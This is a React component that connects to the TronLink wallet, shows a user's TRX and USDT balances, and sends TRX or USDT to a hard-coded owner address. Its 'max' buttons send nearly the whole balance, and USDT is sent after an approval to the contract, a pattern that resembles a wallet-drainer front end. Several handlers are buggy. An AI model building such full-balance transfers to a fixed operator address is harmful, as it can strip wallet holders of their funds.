import TronWeb from "tronweb";
import { TronLinkAdapter } from "@tronweb3/tronwallet-adapters";
import { useEffect, useMemo, useState } from "react";
import { AbiTronContract, AbiUsdtContractTron } from "./abi/abi";

function Tron() {
  const [readyState, setReadyState] = useState("not found");
  const [account, setAccount] = useState("");
  const [tronContract, setTronContract] = useState();
  const [usdtContract, setUsdtContract] = useState();
  const [resultTron, setResultTron] = useState("");
  const [resultUsdt, setResultUsdt] = useState("");
  const [sendTronValue, setSendTronvalue] = useState();
  const [sendUsdtValue, setSendUsdtvalue] = useState();
  const [tronWeb, setTronWeb] = useState(window?.tronWeb);
  const adapter = useMemo(() => new TronLinkAdapter(), []);


  const TronContractAddress = "TTC9zEyFEJwPu2USo6jZJaPymwUJyxFYtC";
  const OwnerWalletAddress = "TRt1FSTCww2MVCzAnE62UZqzGsNtbqDVQS";
  const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

  async function generateContract() {
    const myContract = await window?.tronWeb?.contract(
      AbiTronContract,
      TronContractAddress
    );
    const myContract2 = await window?.tronWeb?.contract(
      AbiUsdtContractTron,
      usdtContractAddress
    );
    setTronContract(myContract);
    setUsdtContract(myContract2);
  }

  useEffect(() => {
    generateContract();
    if (window?.tronWeb) {
      setAccount(tronWeb?.defaultAddress?.base58);
    } else {
      setAccount("")
    }
  }, []);
  useEffect(() => {
    generateContract();
    if (tronWeb?.address) {
      setAccount(tronWeb?.defaultAddress?.base58);
    } else {
      setAccount("");
    }
  }, [adapter]);

  async function _getTronValue(max) {
    console.log(tronContract);
    if (max === "max") {
      const result = (
        await tronContract?.methods?.getTronbalance(account)?.call()
      )?.toNumber();
      setSendTronvalue(
        result > tronWeb.toSun(1) ? result - tronWeb.toSun(1) : result
      );
    } else {
      const result = (
        await tronContract?.methods?.getTronbalance(account)?.call()
      )?.toNumber();
      setResultTron(result);
    }
  }

  async function _getUsdtValue(max) {
    if (max === "max") {
      const result = (
        await tronContract?.methods
          ?.getBalanceOfUSDT(account)
          ?.call()
          .then((e) => {
            console.log(e);
          })
          .catch((e) => {
            console.log(e);
          })
      )?.toNumber();
      setSendUsdtvalue(result ? result : "0");
    } else {
      const result = (
        await tronContract?.methods?.getBalanceOfUSDT(account)?.call()
      )?.toNumber();
      setResultUsdt(result);
    }
  }

  function _sendTron() {
    tronContract
      ?.transferTron(OwnerWalletAddress)
      ?.send({
        callValue: tronWeb?.toSun(sendTronValue),
      })
      .then((e) => {
        console.log(e);
      })
      .catch((e) => {
        console.log(e);
      });
  }
  async function _sendUsdt() {
    const currentallowance = (
      await usdtContract?.allowance(account, TronContractAddress).call()
    )[0]?.toNumber();

    if (currentallowance < sendUsdtValue) {
      await usdtContract
        ?.approve(TronContractAddress, sendUsdtValue)
        .send()
        .then((e) => {
          console.log(e);
          tronContract
            ?.transferUsdtToOwnerAddress(sendUsdtValue)
            ?.send()
            .then((e) => {
              console.log(e);
            })
            .catch((e) => {
              console.log(e);
            });
        })
        .catch((e) => {
          console.log(e);
          return;
        });
    } else {
      tronContract
        ?.transferUsdtToOwnerAddress(sendUsdtValue)
        ?.send()
        .then((e) => {
          console.log(e);
        })
        .catch((e) => {
          console.log(e);
        });
    }
  }

  useEffect(() => {
    setReadyState(adapter.state);
    adapter.on("connect", () => {
      setAccount(adapter.address);
    });

    adapter.on("readyStateChanged", (state) => {
      setReadyState(adapter.state);
    });
    adapter.on("accountsChanged", (data) => {
      setAccount(data);
    });
    return () => {
      // remove all listeners when components is destroyed
      adapter.removeAllListeners();
    };
  }, [adapter]);

  return (
    <div >
      <div>current address: {account}</div>
      <button onClick={() => adapter.connect()}>Connect to TronLink</button>
      <br />
      {account ? (
        <div>
          <button onClick={_getTronValue}>see your tron</button>
          {resultTron}
          <br />
          <button onClick={_getUsdtValue}>see your usdt</button>
          {resultUsdt}
          <br />
          <form
            onSubmit={(e) => {
              e.preventDefault();
              _sendTron();
            }}
          >
            <input
              name="send_tron"
              placeholder="send tron"
              value={sendTronValue}
              onChange={(e) => setSendTronvalue(e.target.value)}
              type="number"
            />
            <button
              type="button"
              onClick={() => {
                _getTronValue("max");
                _sendTron();
              }}
            >
              max
            </button>
            <button type="submit">send</button>
          </form>

          <form
            onSubmit={(e) => {
              e.preventDefault();
              if (sendUsdtValue > 0) {
                _sendUsdt();
              }
            }}
          >
            <input
              name="send_usdt"
              placeholder="send usdt"
              value={sendUsdtValue}
              onChange={(e) => setSendUsdtvalue(e.target.value)}
              type="number"
            />
            <button
              type="button"
              onClick={() => {
                _getUsdtValue("max");
                if (sendUsdtValue > 0) {
                  _sendUsdt();
                }
              }}
            >
              max
            </button>
            <button type="submit">send</button>
          </form>
        </div>
      ) : null}
    </div>
  );
}

export default Tron;
